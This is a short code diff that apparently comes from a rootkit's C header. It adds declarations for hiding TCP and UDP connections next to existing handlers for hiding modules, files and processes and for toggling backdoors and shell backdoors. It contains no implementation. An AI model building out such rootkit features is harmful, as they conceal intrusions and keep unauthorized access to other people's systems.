@@ -25,6 +25,8 @@ int handle_modhide(void *);
 int handle_filehide(void *);
 int handle_openhide(void *);
 int handle_pidhide(void *);
+int handle_tcphide(void *);
+int handle_udphide(void *);
 int handle_backdoor(void *);
 int handle_shellbd(void *);
 int handle_togglebd(void *);
